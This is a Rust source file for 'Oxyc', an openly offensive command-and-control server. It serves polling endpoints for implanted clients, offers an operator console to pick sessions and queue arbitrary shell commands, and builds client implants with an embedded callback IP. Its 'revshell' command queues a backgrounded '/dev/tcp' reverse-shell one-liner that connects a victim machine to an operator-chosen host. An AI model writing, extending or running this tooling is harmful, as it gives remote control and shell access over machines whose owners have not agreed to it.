use actix_protobuf::*;
use actix_web::{web, App, Error, HttpResponse, HttpServer, Result};
use async_std::sync::Mutex;
use c2::ExecuteReq;
use futures::join;
use rustyline::{error::ReadlineError, Editor};
use std::collections::VecDeque;
use std::process::exit;
use std::sync::Arc;
use std::collections:: HashMap;
use std::net::Ipv4Addr;
use local_ip_address::local_ip;
use std::process::Command;
mod c2;

async fn handle_task_result(task_result: ProtoBuf<c2::TaskResult>) -> Result<HttpResponse, Error> {
    let data = task_result.data.clone();
    match data {
        Some(c2::task_result::Data::Execute(execute_res)) => {
            println!("Command executed. Status: {}", execute_res.status);
            println!("Output:\n{}", execute_res.data);
        }
        _ => (),
    }
    HttpResponse::Ok().protobuf(c2::Empty::default())
}

#[derive(Debug, Default, Clone)]
pub struct Event {
    msg: String,
    task_map: HashMap<String, VecDeque<c2::Task>>,
}

pub fn gen_uuid(ip: &str, mac: &str) -> String {
    let ip_mac = format!("{}{}", ip, mac);
    let digest = md5::compute(ip_mac.as_bytes());
    return format!("{:x}", digest);
}

async fn handle_poll(
    bot_id: ProtoBuf<c2::BotId>,
    broker: web::Data<Arc<Mutex<Event>>>,
) -> Result<HttpResponse, Error> {
    let mut res_task: Option<c2::Task> = None;
    let id = gen_uuid(&bot_id.ip, &bot_id.mac);

    let mut event = broker.lock().await;
    let task_map = &mut event.task_map;
    let task_deque = task_map.entry(id).or_insert(VecDeque::new());
    let task = task_deque.pop_front();

    match task {
        Some(tk) => {
            res_task = Some(tk);
        }
        None => {
            let mut res = c2::Task::default();
            let data = c2::task::Data::Execute(ExecuteReq {
                cmd: "whoami".to_string(),
            });
            res.data = None;
            res_task = Some(res);
        }
    }

    HttpResponse::Ok().protobuf(res_task.unwrap())
}

async fn handle_cli(broker: Arc<Mutex<Event>>) -> Result<(), Error> {
    let mut rl = Editor::<()>::new();
    if rl.load_history("history.txt").is_err() {
        println!("No previous history.");
    }
    let mut prompt = "🔗 oxyc>> ".to_string();
    let mut current_session: Option<String> = None;

    loop {
        if let Some(ref session) = current_session {
            prompt = format!("({}) 🔗 oxyc>> ", session);
        } else {
            prompt = "oxyc>> ".to_string();
        }

        let readline = rl.readline(&prompt);
        match readline {
            Ok(line) => {
                if line.is_empty() {
                    continue;
                }
                let parts = line.split_ascii_whitespace().map(|x| x.to_string()).collect::<Vec<String>>();
                let mut event = broker.lock().await;
                let task_map = &mut event.task_map;

                if &line == "help" {
                    println!("Available commands:");
                    println!("  sessions            - List all communicating beacons");
                    println!("  use [session index] - Use session");
                    println!("  help                - Display this help message");
                    println!("  exit                - Exit the current session");
                    println!("  cmd [command]       - Execute a shell command");
                    println!("  revshell            - Set up a reverse shell");
                    println!("  compile client [ip] - Compile client with specific IP address");
                    // Add more commands and descriptions as needeDisplay this help messaged
                    continue;
                }
                // List sessions with indices
                if &line == "sessions" {
                    let keys = task_map.keys().collect::<Vec<&String>>();
                    for (i, key) in keys.iter().enumerate() {
                        println!("[{}] {}", i, key);
                    }
                    continue;
                }

                // Use session by name or index
                if parts.len() == 2 && parts[0] == "use" {
                    let keys = task_map.keys().collect::<Vec<&String>>();

                    // Try to use session by index
                    if let Ok(index) = parts[1].parse::<usize>() {
                        if let Some(key) = keys.get(index) {
                            current_session = Some(key.clone().to_string());
                            println!("[*] Using session: {}", key);
                        } else {
                            println!("[*] Invalid session index");
                        }
                    } 
                    // Try to use session by name
                    else if task_map.get(&parts[1]).is_some() {
                        current_session = Some(parts[1].clone());
                        println!("[*] Using session: {}", &parts[1]);
                    } 
                    else {
                        println!("[*] No such session");
                    }
                    continue;
                }

                // Exit the current session
                if current_session.is_some() && &line == "exit" {
                    println!("[*] Exiting session: {}", current_session.clone().unwrap());
                    current_session = None;
                    continue;
                }

                if current_session.is_none() && &line == "exit" {
                    println!("[*] Stopping the server...");
                    exit(0);
                }

                // Add task to the current session
                if current_session.is_some() && parts.len() > 1 && parts[0] == "cmd" {
                    let task = c2::Task {
                        data: Some(c2::task::Data::Execute(ExecuteReq {
                            cmd: parts[1..].join(" "),
                        })),
                    };
                    if let Some(td) = task_map.get_mut(&current_session.clone().unwrap()) {
                        (*td).push_back(task);
                        println!("[*] Task added successfully");
                    } else {
                        println!("[*] Current session not in task_map");
                    }
                }

                if current_session.is_some() && &line == "revshell" {
                    handle_revshell(task_map, &current_session.clone().unwrap()).await;
                    continue;
                }

                if parts[0] == "compile" && parts[1] == "client" {
                    let ip = if parts.len() > 2 {
                        parts[2].to_string()
                    } else {
                        match local_ip() {
                            Ok(ip) => ip.to_string(),
                            Err(_) => {
                                println!("No IP address available. Please check your network connection or provide an IP.");
                                continue;
                            }
                        }
                    };
                
                    println!("Compiling client with IP: {}", ip);
                
                    // Copy client.rs to c2lient.rs
                    let cp_command = "cp ~/Oxyc/src/client.rs ~/Oxyc/src/c2lient.rs";
                    Command::new("sh")
                        .arg("-c")
                        .arg(cp_command)
                        .output()
                        .expect("Failed to copy client.rs");
                
                    // Update c2lient.rs with the correct IP
                    let sed_command = format!("sed -i 's/127\\.0\\.0\\.1/{}/g' ~/Oxyc/src/c2lient.rs", ip);
                    Command::new("sh")
                        .arg("-c")
                        .arg(&sed_command)
                        .output()
                        .expect("Failed to update client IP");
                
                    // Compile the c2lient code (in the release folder)
                    let output = Command::new("cargo")
                        .args(&["build", "--release", "--bin", "c2lient"])
                        .output()
                        .expect("Failed to compile client");
                
                    if output.status.success() {
                        println!("Client compiled successfully with IP: {}", ip);
                    } else {
                        println!("Failed to compile client");
                        println!("Error: {}", String::from_utf8_lossy(&output.stderr));
                    }
                
                    continue;
                }

                rl.add_history_entry(line.as_str());
                println!("Line: {}", line);
            }
            Err(ReadlineError::Interrupted) => {
                println!("CTRL-C");
                break;
            }
            Err(ReadlineError::Eof) => {
                println!("CTRL-D");
                break;
            }
            Err(err) => {
                println!("Error: {:?}", err);
                break;
            }
        }
    }
    rl.save_history("history.txt").unwrap();
    Ok(())
}

async fn handle_revshell(task_map: &mut HashMap<String, VecDeque<c2::Task>>, session: &str) {
    println!("Enter the IP address to connect to:");
    let mut ip = String::new();
    std::io::stdin().read_line(&mut ip).unwrap();
    let ip = ip.trim();

    println!("Enter the port to connect to:");
    let mut port = String::new();
    std::io::stdin().read_line(&mut port).unwrap();
    let port = port.trim();

    let revshell_cmd = format!(
        "nohup sh -c 'sh -i >& /dev/tcp/{}/{} 0>&1' > /dev/null 2>&1 &",
        ip, port
    );
    
    let task = c2::Task {
        data: Some(c2::task::Data::Execute(ExecuteReq {
            cmd: revshell_cmd,
        })),
    };

    if let Some(td) = task_map.get_mut(session) {
        (*td).push_back(task);
        println!("[*] Reverse shell task added successfully");
        println!("[*] The reverse shell will run in the background on the client");
    } else {
        println!("[*] Current session not in task_map");
    }
}

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    std::env::set_var("RUST_LOG", "actix_web=debug,actix_server=info");
    env_logger::init();

    println!("   ____              _____ ___        ");
    println!("  / __ \\            / ____|__ \\     ");
    println!(" | |  | |_  ___   _| |       ) |      ");
    println!(" | |  | \\ \\/ / | | | |      / /     ");
    println!(" | |__| |>  <| |_| | |____ / /_       ");
    println!("  \\____//_/\\_\\\\__, |\\_____|____| ");
    println!("               __/ |                  ");
    println!("              |___/    - By @hexkaster");
    println!("                                      ");
    println!("       Type 'help' for help.          ");
    println!("                                      ");

    
    let mut event = Event::default();
    let tasks: VecDeque<c2::Task> = VecDeque::new();
    event.task_map.insert("client0".to_string(), tasks);
    let app_data = Arc::new(Mutex::new(event));

    let cli_future = handle_cli(app_data.clone());

    let server_future = HttpServer::new(move || {
        App::new()
            .data(app_data.clone())
            .service(web::resource("/poll").route(web::post().to(handle_poll)))
            .service(web::resource("/push_task_result").route(web::post().to(handle_task_result)))
    })
    .bind("0.0.0.0:8080")?
    .run();

    let _ = join!(cli_future, server_future);

    Ok(())
}